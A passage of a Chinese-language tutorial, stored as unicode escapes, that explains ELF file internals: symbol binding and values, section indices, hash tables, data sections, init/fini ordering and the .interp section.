\u4f4d\u8868\u793a\u7b26\u53f7\u7ed1\u5b9a\u7684\u4fe1\u606f\u3002\u800c\u8fd9\u90e8\u5206\u4fe1\u606f\u786e\u5b9a\u4e86\u7b26\u53f7\u7684\u94fe\u63a5\u53ef\u89c1\u6027\u4ee5\u53ca\u5176\u884c\u4e3a\uff0c\u5177\u4f53\u7684\u53d6\u503c\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nSTB_LOCAL\n\n\n0\n\n\n\u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5c40\u90e8\u7b26\u53f7\uff0c\u5728\u5305\u542b\u8be5\u7b26\u53f7\u5b9a\u4e49\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u5916\u4e0d\u53ef\u89c1\u3002\u76f8\u540c\u540d\u79f0\u7684\u5c40\u90e8\u7b26\u53f7\u53ef\u4ee5\u5b58\u5728\u4e8e\u591a\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4e92\u4e0d\u5f71\u54cd\u3002\n\n\n\n\n\n\nSTB_GLOBAL\n\n\n1\n\n\n\u8868\u660e\u8be5\u7b26\u53f7\u4e3a\u5168\u5c40\u7b26\u53f7\uff0c\u5bf9\u6240\u6709\u5c06\u88ab\u7ec4\u5408\u5728\u4e00\u8d77\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\u3002\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5bf9\u67d0\u4e2a\u5168\u5c40\u7b26\u53f7\u7684\u5b9a\u4e49\u5c06\u6ee1\u8db3\u53e6\u4e00\u4e2a\u6587\u4ef6\u5bf9\u76f8\u540c\u5168\u5c40\u7b26\u53f7\u7684\u672a\u5b9a\u4e49\u5f15\u7528\u3002\u6211\u4eec\u79f0\u521d\u59cb\u5316\u975e\u96f6\u53d8\u91cf\u7684\u5168\u5c40\u7b26\u53f7\u4e3a\u5f3a\u7b26\u53f7\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u6b21\u3002\n\n\n\n\n\n\nSTB_WEAK\n\n\n2\n\n\n\u5f31\u7b26\u53f7\u4e0e\u5168\u5c40\u7b26\u53f7\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u5b83\u4eec\u7684\u5b9a\u4e49\u4f18\u5148\u7ea7\u6bd4\u8f83\u4f4e\u3002\n\n\n\n\n\n\nSTB_LOPROC  ~STB_HIPROC\n\n\n13\n\n\n\u8fd9\u4e2a\u8303\u56f4\u7684\u53d6\u503c\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u3002\n\n\n\n\n\n\n\n\n\u5728\u6bcf\u4e2a\u7b26\u53f7\u8868\u4e2d\uff0c\u6240\u6709\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u7684\u7b26\u53f7\u90fd\u4f18\u5148\u4e8e\u5f31\u7b26\u53f7\u548c\u5168\u5c40\u7b26\u53f7\u3002\u7b26\u53f7\u8868\u8282\u533a\u4e2d\u7684 sh_info \u9879\u6240\u5bf9\u5e94\u7684\u5934\u90e8\u7684\u6210\u5458\u5305\u542b\u7b2c\u4e00\u4e2a\u975e\u5c40\u90e8\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002\n\n\n\u6b64\u5916\uff0c\u5168\u5c40\u7b26\u53f7\u4e0e\u5f31\u7b26\u53f7\u7684\u4e3b\u8981\u533a\u522b\u5982\u4e0b\uff1a\n\n\n\n\n\u5f53\u94fe\u63a5\u5668\u5728\u94fe\u63a5\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u4e0d\u5141\u8bb8\u5b9a\u4e49\u591a\u4e2a\u76f8\u540c\u540d\u5b57\u7684 \nSTB_GLOBAL\n \u7b26\u53f7\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5df2\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u4f18\u5148\u9009\u62e9\u5168\u5c40\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002\u7c7b\u4f3c\u7684\uff0c\u5982\u679c\u4e00\u4e2a\u516c\u5171\u7b26\u53f7\u5b58\u5728(\nst_shndx\n\u57df\u4e3a\nSHN_COMMON\n\u7684\u7b26\u53f7)\uff0c\u5219\u540c\u540d\u7684\u5f31\u7b26\u53f7\u7684\u5b58\u5728\u4e0d\u4f1a\u5f15\u8d77\u9519\u8bef\u3002\u94fe\u63a5\u5668\u4f1a\u9009\u62e9\u516c\u5171\u5b9a\u4e49\uff0c\u5ffd\u7565\u5f31\u7b26\u53f7\u5b9a\u4e49\u3002\n\n\n\u5f53\u94fe\u63a5\u5668\u5bfb\u627e\u6587\u4ef6\u5e93\u65f6\uff0c\u5b83\u4f1a\u63d0\u53d6\u5305\u542b\u672a\u5b9a\u4e49\u5168\u5c40\u7b26\u53f7\u7684\u6210\u5458\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5168\u5c40\u7b26\u53f7\u6216\u8005\u5f31\u7b26\u53f7\u3002\u94fe\u63a5\u5668\u4e0d\u4f1a\u4e3a\u4e86\u89e3\u51b3\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u95ee\u9898\u800c\u63d0\u53d6\u6587\u4ef6\uff0c\u672a\u5b9a\u4e49\u7684\u5f31\u7b26\u53f7\u7684\u503c\u4e3a0\u3002\n\n\n\n\n\u7b26\u53f7\u53d6\u503c\n\n\n\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u5bf9\u7b26\u53f7\u8868\u9879\u4e2d st_value \u6210\u5458\u7684\u89e3\u91ca\u4e0d\u540c\uff1a\n\n\n\n\n\u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u8282\u533a\u7d22\u5f15\u4e3a SHN_COMMON \u7684\u7b26\u53f7\u7684\u5bf9\u9f50\u7ea6\u675f\u3002\n\n\n\u5728\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e2d\uff0cst_value \u4fdd\u5b58\u4e86\u5df2\u5b9a\u4e49\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cst_value\u4fdd\u7559\u4e86st_shndx \u6240\u6807\u8bc6\u7684\u8282\u533a\u7684\u5934\u90e8\u5230\u7b26\u53f7\u4f4d\u7f6e\u7684\u504f\u79fb\u3002\n\n\n\u5728\u53ef\u6267\u884c\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff0cst_value \u5305\u542b\u4e00\u4e2a\u865a\u5730\u5740\u3002\u4e3a\u4e86\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u7b26\u53f7\u5bf9\u52a8\u6001\u94fe\u63a5\u5668\u66f4\u6709\u7528\uff0c\u8282\u533a\u504f\u79fb\uff08\u9488\u5bf9\u6587\u4ef6\u7684\u89e3\u91ca\uff09\u7ed9\u51fa\u4e86\u4e0e\u8282\u533a\u53f7\u65e0\u5173\u7684\u865a\u62df\u5730\u5740\uff08\u9488\u5bf9\u5185\u5b58\u7684\u89e3\u91ca\uff09\u3002\n\n\n\n\n\u7b26\u53f7\u8868\u53d6\u503c\u5728\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u4e2d\u5177\u6709\u76f8\u4f3c\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u6709\u9002\u5f53\u7684\u7a0b\u5e8f\u53ef\u4ee5\u91c7\u53d6\u9ad8\u6548\u7684\u65b9\u6cd5\u6765\u8bbf\u95ee\u6570\u636e\u3002\n\n\nst_shndx\n\n\n\u7279\u6b8a\u7684\u7d22\u5f15\u53ca\u5176\u610f\u4e49\u5982\u4e0b\n\n\n\n\nSHN_ABS\uff1a \u7b26\u53f7\u7684\u53d6\u503c\u5177\u6709\u7edd\u5bf9\u6027\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u91cd\u5b9a\u4f4d\u800c\u53d1\u751f\u53d8\u5316\u3002\n\n\nSHN_COMMON\uff1a  \u7b26\u53f7\u6807\u8bb0\u4e86\u4e00\u4e2a\u5c1a\u672a\u5206\u914d\u7684\u516c\u5171\u5757\u3002\u7b26\u53f7\u7684\u53d6\u503c\u7ed9\u51fa\u4e86\u5bf9\u9f50\u7ea6\u675f\uff0c\u4e0e\u8282\u533a\u7684 sh_addralign \u6210\u5458\u7c7b\u4f3c\u3002\u5c31\u662f\u8bf4\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u5728\u5730\u5740\u4f4d\u4e8e st_value \u7684\u500d\u6570\u5904\u4e3a\u7b26\u53f7\u5206\u914d\u7a7a\u95f4\u3002\u7b26\u53f7\u7684\u5927\u5c0f\u7ed9\u51fa\u4e86\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\u3002\n\n\nSHN_UNDEF\uff1a  \u6b64\u7d22\u5f15\u503c\u8868\u793a\u7b26\u53f7\u6ca1\u6709\u5b9a\u4e49\u3002\u5f53\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u6b64\u76ee\u6807\u6587\u4ef6\u4e0e\u5176\u4ed6\u5b9a\u4e49\u4e86\u8be5\u7b26\u53f7\u7684\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u7ec4\u5408\u65f6\uff0c\u6b64\u6587\u4ef6\u4e2d\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u5c06\u88ab\u94fe\u63a5\u5230\u5b9e\u9645\u5b9a\u4e49\u7684\u4f4d\u7f6e\u3002\n\n\n\n\n\u5982\u4f55\u5b9a\u4f4d\n\n\n\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a\u7b26\u53f7\u6765\u8bf4\u5982\u4f55\u5b9a\u4f4d\u5176\u5bf9\u5e94\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5462\uff1f\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u6839\u636e Section Header Table \u4e2d\u7b26\u53f7\u8282\u5934\u4e2d\u7684 \nsh_link\n \u83b7\u53d6\u8be5\u7b26\u53f7\u8282\u4e2d\u5bf9\u5e94\u7b26\u53f7\u5b57\u7b26\u4e32\u8282\u5728 \nSection Header Table\n \u4e2d\u7684\u4e0b\u6807\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8282\u7684\u5730\u5740\u3002\n\n\n\u6839\u636e\u8be5\u7b26\u53f7\u7684\u5b9a\u4e49\u4e2d\u7684 st_name \u83b7\u53d6\u8be5\u7b26\u53f7\u7684\u504f\u79fb\uff0c\u5373\u5728\u5bf9\u5e94\u7b26\u53f7\u8282\u4e2d\u7684\u504f\u79fb\u3002\n\n\n\u6839\u636e\u4e0a\u8ff0\u4e24\u8005\u5c31\u53ef\u4ee5\u5b9a\u4f4d\u4e00\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\u4e86\u3002\n\n\n\n\n.gnu.hash\n\n\n\u6ce8\uff1a\u672c\u90e8\u5206\u4e3b\u8981\u53c2\u8003https://blogs.oracle.com/ali/gnu-hash-elf-sections\u3002\n\n\n\u5728 ELF \u826f\u597d\u5730\u53ef\u6269\u5c55\u6027\u7684\u5e2e\u52a9\u4e0b\uff0c GNU \u4e3a ELF \u5bf9\u8c61\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u54c8\u5e0c\u8282\uff0c\u8fd9\u4e2a\u8282\u7684\u6027\u80fd\u76f8\u6bd4\u4e8e\u539f\u6709\u7684 \nSYSV hash\n \u4f1a\u597d\u5f88\u591a\u3002\u8be5\u8282\u7528\u4e8e\u5feb\u901f\u6839\u636e\u7b26\u53f7\u540d\u83b7\u53d6\u5bf9\u5e94\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\u3002\n\n\n\u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u8003 \nhttps://blogs.oracle.com/ali/entry/gnu_hash_elf_sections\n\u3002 \n\u6709\u5f85\u8fdb\u4e00\u6b65\u5b66\u4e60\u3002\n\n\nELF \u6807\u51c6\n\n\nELF\u6587\u4ef6\u4e2d\u7684\u54c8\u5e0c\u8868\u7531 Elf32_Word \u5bf9\u8c61\u6784\u6210\uff0c\u7528\u6765\u652f\u6301\u7b26\u53f7\u8868\u8bbf\u95ee\u3002\u4e0b\u9762\u7684\u7b26\u53f7\u53ef\u4ee5\u7528\u6765\u8f85\u52a9\u89e3\u91ca\u7b26\u53f7\u8868\u7684\u7ec4\u7ec7\u60c5\u51b5\uff0c\u4f46\u662f\u4ed6\u4eec\u5e76\u4e0d\u662f ELF \u6587\u4ef6\u8bf4\u660e\u7684\u4e00\u90e8\u5206\u3002\n\n\n\n\nbucket\u6570\u7ec4\u5305\u542b\u4e86nbucket\u4e2a\u5143\u7d20\uff0cchain\u6570\u7ec4\u5305\u542b\u4e86nchain\u4e2a\u5143\u7d20\uff0c\u6240\u6709\u7684\u6570\u7ec4\u7684\u4e0b\u6807\u90fd\u662f\u4ee50\u5f00\u59cb\u3002bucket\u548cchain\u90fd\u5305\u542b\u7b26\u53f7\u8868\u7d22\u5f15\u3002chain\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u662f\u548c\u7b26\u53f7\u8868\u4e2d\u7684\u5143\u7d20\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u56e0\u6b64\u7b26\u53f7\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5fc5\u987b\u548cnchain\u7684\u5927\u5c0f\u76f8\u540c\uff0c\u6545\u800c\u7b26\u53f7\u8868\u7684\u7d22\u5f15\u540c\u6837\u53ef\u4ee5\u4f5c\u4e3achain\u8868\u7684\u7d22\u5f15\u3002\u4e0b\u9762\u5c55\u793a\u7684\u54c8\u5e0c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7b26\u53f7\u540d\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u88ab\u7528\u4e8e\u8ba1\u7b97bucket\u7684\u7d22\u5f15\u3002\u56e0\u6b64\uff0c\u5982\u679c\u54c8\u5e0c\u51fd\u6570\u9488\u5bf9\u4e8e\u67d0\u4e2a\u540d\u5b57\u8fd4\u56de\u503cx\uff0c\u90a3\u4e48\nbucket[x%nbucket]\n \u7ed9\u51fa\u4e86\u4e00\u4e2a\u7d22\u5f15y\uff0c\u53ef\u4ee5\u7528\u6765\u7d22\u5f15\u7b26\u53f7\u8868\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u7d22\u5f15chain\u8868\u3002\u5982\u679c\u7b26\u53f7\u8868\u7684\u5bf9\u5e94\u7d22\u5f15\u5e76\u4e0d\u662f\u6240\u60f3\u8981\u7684\u54ea\u4e00\u4e2a\uff0c\u90a3\u4e48chain[y]\u5c31\u4f1a\u7ed9\u51fa\u7ed9\u51fa\u540c\u4e00\u4e2a\u54c8\u5e0c\u503c\u7684\u4e0b\u4e00\u4e2a\u7b26\u53f7\u8868\u4e2d\u8868\u9879\u7684\u4f4d\u7f6e\uff0c\u5373\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u51fa\u73b0\u54c8\u5e0c\u503c\u4e00\u6837\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740chain\u94fe\u4e00\u76f4\u641c\u7d22\u76f4\u5230\u9047\u5230\u6240\u60f3\u8981\u7684\u7b26\u53f7\uff0c\u6216\u8005\u9047\u5230\u503c\u4e3a\nSTN_UNDEF\n \u7684chain\u7684\u8868\u9879\u3002\n\n\n\n\nData Related Sections\n\n\nBSS Section\n\n\n\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u5bf9\u5e94\u7684\u8282\u3002\u6b64\u8282\u533a\u4e0d\u5360\u7528 ELF \u6587\u4ef6\u7a7a\u95f4\uff0c\u4f46\u5360\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u7684\u7a7a\u95f4\u3002\u5f53\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u521d\u59cb\u5316\u4e3a 0\u3002bss\u5176\u5b9e\u662fblock started by symbol\u7684\u7b80\u5199\uff0c\u8bf4\u660e\u8be5\u8282\u533a\u4e2d\u5355\u7eaf\u5730\u8bf4\u660e\u4e86\u6709\u54ea\u4e9b\u53d8\u91cf\u3002\n\n\n.data Section\n\n\n\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u521d\u59cb\u5316\u4e86\u7684\u6570\u636e\uff0c\u4f1a\u5728\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u51fa\u73b0\u3002\n\n\n.rodata Section\n\n\n\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u53ea\u8bfb\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u53c2\u4e0e\u8fdb\u7a0b\u6620\u50cf\u7684\u4e0d\u53ef\u5199\u6bb5\u3002\n\n\nCommon Code Section\n\n\n\u6982\u8ff0\n\n\n\u5728\u52a8\u6001\u94fe\u63a5\u5668\u521b\u5efa\u4e86\u8fdb\u7a0b\u955c\u50cf\uff0c\u5e76\u4e14\u6267\u884c\u4e86\u91cd\u5b9a\u4f4d\u540e\uff0c\u6bcf\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u673a\u4f1a\u53bb\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u4ee3\u7801\u3002\u6240\u6709\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u6743\u9650\u4e4b\u524d\u8fdb\u884c\u521d\u59cb\u5316\u3002\n\n\n\u5728\u8c03\u7528\u76ee\u6807\u6587\u4ef6 A \u7684\u521d\u59cb\u5316\u4ee3\u7801\u4e4b\u524d\uff0c\u4f1a\u9996\u5148\u8c03\u7528\u6240\u6709 A \u4f9d\u8d56\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u4ee3\u7801\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u76ee\u6807\u6587\u4ef6 A \u4f9d\u8d56\u4e8e\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6 B\uff0c\u90a3\u4e48 B \u5c31\u4f1a\u5728 A \u7684\u4f9d\u8d56\u5217\u8868\u4e2d\uff0c\u8fd9\u4f1a\u88ab\u8bb0\u5f55\u5728\u52a8\u6001\u7ed3\u6784\u7684 DT_NEEDED \u4e2d\u3002\u5faa\u73af\u4f9d\u8d56\u7684\u521d\u59cb\u5316\u662f\u672a\u88ab\u5b9a\u4e49\u7684\u3002\n\n\n\u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u901a\u8fc7\u9012\u5f52\u6bcf\u4e00\u4e2a\u88ab\u4f9d\u8d56\u7684\u8868\u9879\u6765\u5b8c\u6210\u3002\u53ea\u6709\u5f53\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4f9d\u8d56\u7684\u6240\u6709\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u5904\u7406\u5b8c\u81ea\u5df1\u7684\u4f9d\u8d56\u540e\uff0c\u8fd9\u4e2a\u76ee\u6807\u6587\u4ef6\u624d\u4f1a\u6267\u884c\u521d\u59cb\u5316\u4ee3\u7801\u3002\n\n\n\u4e0b\u9762\u7684\u4f8b\u5b50\u89e3\u91ca\u4e86\u4e24\u79cd\u6b63\u786e\u7684\u53ef\u4ee5\u7528\u6765\u751f\u6210\u7ed9\u5b9a\u4f8b\u5b50\u7684\u987a\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0ca.out \u4f9d\u8d56\u4e8eb\uff0cd \u4ee5\u53ca e\u3002b\u4f9d\u8d56\u4e8ed \u548c f\uff0c\u5e76\u4e14 d \u4f9d\u8d56\u4e8e e \u548c g\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5982\u4e0b\u7684\u4f9d\u8d56\u56fe\u3002\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\u7b97\u6cd5\uff0c\u5c06\u5141\u8bb8\u6211\u4eec\u6309\u7167\u5982\u4e0b\u7684\u987a\u5e8f\u8fdb\u884c\u521d\u59cb\u5316\u3002\n\n\n\n\n\u7c7b\u4f3c\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e5f\u4f1a\u6709\u7ed3\u675f\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u8fdb\u7a0b\u5b8c\u6210\u81ea\u5df1\u7684\u7ec8\u6b62\u5e8f\u5217\u65f6\u901a\u8fc7 atexit \u673a\u5236\u6765\u6267\u884c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u8c03\u7528\u7ec8\u6b62\u51fd\u6570\u7684\u987a\u5e8f\u6070\u597d\u4e0e\u4e0a\u9762\u521d\u59cb\u5316\u7684\u987a\u5e8f\u76f8\u53cd\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u786e\u4fdd\u5b83\u53ea\u4f1a\u6267\u884c\u521d\u59cb\u5316\u6216\u8005\u7ec8\u6b62\u51fd\u6570\u6700\u591a\u4e00\u6b21\u3002\n\n\n\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u8fc7\u52a8\u6001\u7ed3\u6784\u4e2d\u7684 DT_INIT \u548c DT_FINI \u6765\u6307\u5b9a\u5b83\u4eec\u7684\u521d\u59cb\u5316\u4ee5\u53ca\u7ed3\u675f\u51fd\u6570\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728.init\u8282\u4e0e.fini\u8282\u4e2d\u3002\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u5c3d\u7ba1ateixt\u7ec8\u6b62\u5904\u7406\u51fd\u6570\u901a\u5e38\u6765\u8bf4\u4f1a\u88ab\u6267\u884c\uff0c\u4f46\u5b83\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u5728\u7a0b\u5e8f\u6d88\u4ea1\u65f6\u88ab\u6267\u884c\u3002\u66f4\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u7a0b\u5e8f\u8c03\u7528\u4e86_exit\u51fd\u6570\u6216\u8005\u8fdb\u7a0b\u7531\u4e8e\u63a5\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7\u540e\u6d88\u4ea1\u4e86\uff0c\u90a3\u4e48\u5b83\u5c06\u4e0d\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002\n\n\n\n\n\u52a8\u6001\u94fe\u63a5\u5668\u5e76\u4e0d\u8d1f\u8d23\u8c03\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684 .init \u8282\u6216\u8005\u5229\u7528 atexit \u6ce8\u518c\u53ef\u6267\u884c\u6587\u4ef6\u7684 .fini \u8282\u3002\u7531\u7528\u6237\u901a\u8fc7 atexit \u673a\u5236\u6307\u5b9a\u7684\u7ec8\u6b62\u51fd\u6570\u5fc5\u987b\u5728\u6240\u6709\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u7ed3\u675f\u51fd\u6570\u524d\u6267\u884c\u3002\n\n\n.init \n .init_array\n\n\n\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u521d\u59cb\u5316\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5728\u5f00\u59cb\u8c03\u7528\u4e3b\u7a0b\u5e8f\u5165\u53e3\uff08\u901a\u5e38\u6307 C \u8bed\u8a00\u7684 main \u51fd\u6570\uff09\u524d\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\u3002\n\n\n.text\n\n\n\u6b64\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6307\u4ee4\u3002\n\n\n.fini \n .fini_array\n\n\n\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u7684\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u7ec8\u6b62\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0c\u7cfb\u7edf\u5c06\u6267\u884c\u8fd9\u91cc\u7684\u4ee3\u7801\u3002 \n\n\nDynamic Related Sections\n\n\n.interp section\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u5177\u6709\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u7a0b\u5e8f\u5934\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u6765\u52a0\u8f7d\u7a0b\u5e8f\u4e2d\u7684\u6bb5\u3002\u8fd9\u4e2a\u8282\u5305\u542b\u4e86\u7a0b\u5e8f\u5bf9\u5e94\u7684\u89e3\u91ca\u5668\u3002\u5728 exec (BA_OS) \u8fc7\u7a0b\u4e2d\uff0c\u7cfb\u7edf\u4f1a\u4ece\u8be5\u8282\u4e2d\u63d0\u53d6\u5bf9\u5e94\u89e3\u91ca\u5668\u7684\u8def\u5f84\uff0c\u5e76\u6839\u636e\u89e3\u91ca\u5668\u6587\u4ef6\u7684\u6bb5\u521b\u5efa\u521d\u59cb\u65f6\u7684\u7a0b\u5e8f\u955c\u50cf\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u5e76\u4e0d\u4f7f\u7528\u7ed9\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u955c\u50cf\uff0c\u800c\u4f1a\u9996\u5148\u4e3a\u89e3\u91ca\u5668\u6784\u9020\u72ec\u7acb\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u89e3\u91ca\u5668\u9700\u8981\u4ece\u7cfb\u7edf\u5904\u83b7\u53d6\u63a7\u5236\u6743\uff0c\u7136\u540e\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u6267\u884c\u73af\u5883\u3002\n\n\n\u89e3\u91ca\u5668\u53ef\u80fd\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6\u63a7\u5236\u6743\u3002\n\n\n\n\n\u5b83\u53ef\u4ee5\u63a5\u6536\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u8bfb\u53d6\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u8bfb\u53d6\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002\n\n\n\u6709\u65f6\u5019\u6839\u636e\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u7cfb\u7edf\u6709\u53ef\u80fd\u4e0d\u4f1a\u628a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed9\u89e3\u91ca\u5668\uff0c\u800c\u662f\u4f1a\u76f4\u63a5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u867d\u7136\u6587\u4ef6\u63cf\u8ff0\u7b26\u53ef\u80fd\u4f1a\u51fa\u73b0\u5f02\u5e38\uff0c\u4f46\u662f\u89e3\u91ca\u5668\u7684\u521d\u59cb\u72b6\u6001\u4ecd\u7136\u4f1a\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6536\u5230\u7684\u76f8\u5339\u914d\uff0c\u89e3\u91ca\u5668\u672c\u8eab\u4e0d\u9700\u8981\u518d\u6709\u4e00\u4e2a\u89e3\u91ca\u5668\u3002\u89e3\u91ca\u5668\u672c\u8eab\u53ef\u80fd\u662f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6216\u8005\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u95ee\u9898\n\n\n\n\n\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u88ab\u52a0\u8f7d\u4e3a\u5730\u5740\u72ec\u7acb\u7684\uff0c\u4e5f\u5c31\u662f